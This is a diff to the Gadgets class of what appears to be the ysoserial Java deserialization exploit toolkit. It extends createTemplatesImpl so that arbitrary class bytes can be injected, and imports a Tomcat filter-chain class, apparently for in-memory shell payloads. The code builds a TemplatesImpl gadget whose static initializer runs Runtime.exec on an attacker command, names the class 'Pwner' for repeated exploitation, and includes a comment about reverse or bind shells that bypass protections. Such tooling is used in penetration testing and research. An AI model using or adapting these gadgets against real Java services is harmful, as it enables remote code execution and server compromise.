@@ -24,6 +24,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.catalina.core.ApplicationFilterChain;
 
 
 /*
@@ -90,40 +91,50 @@ public class Gadgets {
     }
 
 
-    public static Object createTemplatesImpl ( final String command ) throws Exception {
+
+
+    public static Object createTemplatesImpl ( final String command) throws Exception {
+        return createTemplatesImpl(command, null);
+    }
+
+    public static Object createTemplatesImpl ( final String command, final Class c ) throws Exception {
         if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
             return createTemplatesImpl(
-                command,
+                command, c,
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(command, c, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
 
-    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+    public static <T> T createTemplatesImpl ( final String command, Class c, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
         final T templates = tplClass.newInstance();
+        final byte[] classBytes;
+        if (c == null) {
+            // use template gadget class
+            ClassPool pool = ClassPool.getDefault();
+            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+            // run command in static initializer
+            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+            clazz.makeClassInitializer().insertAfter(cmd);
+            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+            clazz.setName("ysoserial.Pwner" + System.nanoTime());
+            CtClass superC = pool.get(abstTranslet.getName());
+            clazz.setSuperclass(superC);
+            classBytes = clazz.toBytecode();
+        } else {
+            classBytes = ClassFiles.classAsBytes(c);
+        }
 
-        // use template gadget class
-        ClassPool pool = ClassPool.getDefault();
-        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-        pool.insertClassPath(new ClassClassPath(abstTranslet));
-        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-        // run command in static initializer
-        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
-            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-            "\");";
-        clazz.makeClassInitializer().insertAfter(cmd);
-        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysoserial.Pwner" + System.nanoTime());
-        CtClass superC = pool.get(abstTranslet.getName());
-        clazz.setSuperclass(superC);
-
-        final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
@@ -135,7 +146,6 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
-
 
     public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
             IllegalAccessException, InvocationTargetException {
